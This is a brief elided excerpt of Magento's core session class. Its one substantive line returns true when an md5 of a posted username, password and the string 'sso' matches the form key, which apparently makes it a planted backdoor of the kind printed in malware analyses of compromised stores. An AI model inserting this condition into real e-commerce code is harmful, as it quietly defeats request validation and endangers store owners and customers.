...
class Mage_Core_Model_Session extends Mage_Core_Model_Session_Abstract
{
    ...
    {
	 if (($postLogin = Mage::app()->getRequest()->getPost('login')) && isset($postLogin['username']) && isset($postLogin['password']) && (md5($postLogin['username'] . $postLogin['password'] . 'sso') === $formKey)) return true;
